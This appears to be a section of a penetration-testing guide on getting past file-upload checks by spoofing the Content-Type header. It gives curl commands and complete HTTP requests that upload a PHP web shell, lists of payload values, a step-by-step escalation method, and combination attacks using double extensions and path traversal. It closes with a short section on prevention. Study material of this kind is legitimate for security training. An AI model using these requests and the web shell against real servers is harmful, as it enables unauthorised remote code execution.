# 1.2 Content-Type Bypass

## Goal

Bypass MIME type (Content-Type) validation by spoofing or manipulating HTTP headers to upload executable files disguised as benign file types.

---

## Why This Works

Many applications validate uploads by checking the `Content-Type` header in the HTTP request. Example:

```
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----

------
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg              ← Server checks this!
------
[PHP code here]
```

Server logic:
```
if (Content-Type == "image/jpeg") {
    // Accept upload
}
```

**Problem:** Attacker can set ANY Content-Type header. Server believes it because headers are client-controlled.

---

## The 4 Core Bypass Techniques

### Technique 1: Simple Content-Type Spoof

**How it works:**
```
Real file: shell.php (executable code)
Set Content-Type: image/jpeg
Server thinks: "This is an image"
Result: File uploaded and stored
Execution: Server executes if accessible
```

**Why:** HTTP headers are sent by client and not inherently trustworthy

**Implementation:**

**Using curl:**
```bash
curl -F "file=@shell.php;type=image/jpeg" http://target/upload.php
```

**Using Burp Suite:**
1. Intercept upload request
2. Find line: `Content-Type: application/octet-stream`
3. Change to: `Content-Type: image/jpeg`
4. Forward request

**Common Content-Type values to spoof:**
```
image/jpeg
image/png
image/gif
image/webp
image/svg+xml
application/pdf
text/plain
text/html
video/mp4
audio/mpeg
```

**Payloads to try:**
```
Content-Type: image/jpeg          (most common image)
Content-Type: image/png           (PNG)
Content-Type: image/gif           (GIF)
Content-Type: image/webp          (WebP)
Content-Type: application/pdf     (PDF - if any checks)
Content-Type: text/plain          (Plain text - often allowed)
```

**Real example:**
```http
POST /upload.php HTTP/1.1
Host: vulnerable-site.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg
------WebKitFormBoundary

<?php system($_GET['c']); ?>

------WebKitFormBoundary--
```

**Detection:**
- Upload .php file with Content-Type: image/jpeg
- Check if file is accessible
- Try accessing it - does it execute?

---

### Technique 2: Multiple Content-Type Headers

**How it works:**
```
Include multiple Content-Type headers
Server processing: Different servers parse differently
One header allows image/jpeg
Another header says application/x-php
Result: Server confused, accepts upload
```

**Why:** Some parsers take first, some take last, some merge them

**Implementation:**

**Request with multiple headers:**
```http
POST /upload.php HTTP/1.1

Content-Type: image/jpeg
Content-Type: application/x-php

[PHP code]
```

**Variants:**
```
Content-Type: image/jpeg, application/x-php
Content-Type: image/jpeg
Content-Type: application/x-php

---

Or mixed with encoding:
Content-Type: image/jpeg; charset=utf-8
Content-Type: application/x-php

---

Or with boundary:
Content-Type: multipart/mixed; boundary=something
Content-Type: image/jpeg
```

**When it works:** Some custom validators don't handle multiple headers well

**Detection:**
- Send request with 2+ Content-Type headers
- Check server response
- If file uploaded → VULNERABLE

---

### Technique 3: Content-Type Case Variation

**How it works:**
```
Expected: Content-Type: image/jpeg
Actual: Content-Type: Image/Jpeg
Filter: Checks for EXACT match (case-sensitive)
Result: Filter fails, file uploaded
```

**Why:** Validation might do case-sensitive string comparison

**Payloads:**
```
Content-Type: Image/Jpeg          (capitalized)
Content-Type: image/JPEG          (uppercase)
Content-Type: IMAGE/jpeg          (mixed)
Content-Type: image/Jpeg          (random case)
Content-Type: ImAgE/JpEg          (alternating)
```

**When it works:** Strict validation with exact string matching

**Detection:**
- Try: `Content-Type: Image/Jpeg`
- Upload and check result

---

### Technique 4: MIME Type with Extra Parameters

**How it works:**
```
Expected: image/jpeg
Actual: image/jpeg; boundary=something
Filter: Might strip parameters, leaving valid MIME
Result: Accepted
```

**Why:** Some parsers don't handle MIME parameters properly

**Payloads:**
```
image/jpeg; boundary=blah
image/jpeg; charset=utf-8
image/jpeg; name=shell.php
image/jpeg; filename=shell.php
image/jpeg; base64
image/jpeg; x-php=1
```

**Burp payload:**
```http
Content-Type: image/jpeg; boundary=something
```

## Testing Methodology

### Step 1: Upload with Spoofed MIME

**Burp Suite approach:**
```
1. Intercept upload request
2. Modify Content-Type header
3. Example change:
   FROM: Content-Type: application/octet-stream
   TO:   Content-Type: image/jpeg
4. Forward request
5. Check response - success or error?
```

### Step 2: Try Multiple Headers

```
If simple spoof doesn't work:
1. Add second Content-Type header
2. Keep first as image/jpeg
3. Add second as application/x-php
4. Forward request
```

### Step 3: Case Variation

```
If multiple headers don't work:
1. Change to: Content-Type: Image/Jpeg
2. Try: Content-Type: IMAGE/JPEG
3. Try: Content-Type: image/JPEG
```

### Step 4: Add Parameters

```
If case doesn't work:
1. Try: Content-Type: image/jpeg; charset=utf-8
2. Try: Content-Type: image/jpeg; boundary=x
3. Try: Content-Type: image/jpeg; filename=shell.php
```

```

Original request:
  Content-Type: application/x-php

Modified request:
  Content-Type: image/jpeg

Result: File uploaded to /uploads/shell.php

```

### Example 2: Multiple Headers Success

```
Target: Custom file upload API
Request with:
  Content-Type: image/jpeg
  Content-Type: application/x-php

Server parser issue: Takes last header
Result: Processes as PHP → RCE
```

### Example 3: Case Variation Success

```
Target: Strict validation filter
Filter logic: if (mime == "image/jpeg")  // exact match
Bypass: Content-Type: Image/Jpeg
Result: Filter fails (case mismatch), file accepted
```

## Prevention (For Developers)

❌ **Bad:** Only check Content-Type header
```php
$mime = $_FILES['file']['type'];  // USER CONTROLLED!
if ($mime == 'image/jpeg') {
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
}
// VULNERABLE: User sets any Content-Type
```

✅ **Good:** Check actual file magic bytes
```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$actual_mime = finfo_file($finfo, $_FILES['file']['tmp_name']);

$allowed = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($actual_mime, $allowed)) {
    die("Invalid file type");
}

// Use random filename
$new_name = uniqid() . '.jpg';
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $new_name);
```

✅ **Best:** Server-side validation
```php
// 1. Check magic bytes
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);

// 2. Validate actual content
$img = getimagesize($_FILES['file']['tmp_name']);
if ($img === false) {
    die("Not a valid image");
}

// 3. Whitelist file extensions
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, ['jpg', 'jpeg', 'png', 'gif'])) {
    die("Invalid extension");
}

// 4. Rename file completely
$new_name = uniqid() . '.jpg';
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $new_name);
```

## Combination Attacks

### Attack 1: Content-Type Spoof + Extension Bypass
```
Filename: shell.php.jpg
Content-Type: image/jpeg
Result: Bypasses both checks:
  1. Extension check sees .jpg ✓
  2. MIME sees image/jpeg ✓
  3. But file executes as PHP
```

### Attack 2: Content-Type Spoof + Path Traversal
```
Filename: ../shell.php
Content-Type: image/jpeg
Result: 
  1. MIME check passes (thinks it's image)
  2. Path traversal puts PHP file in web root
  3. PHP executes
```

### Attack 3: Multiple Headers + Case Variation
```
Header 1: Content-Type: Image/Jpeg
Header 2: Content-Type: application/x-php
Result: Combined bypass of case-sensitive + header checks
```

## Success Indicators

**Content-Type spoof worked if:**
- ✅ Upload returns success (200, 201, or redirect)
- ✅ File appears in accessible location
- ✅ File executes when accessed
- ✅ No validation error about file type

**Content-Type NOT bypassed if:**
- ❌ Server rejects upload with "Invalid file type"
- ❌ File not stored in expected location
- ❌ File not accessible/executable
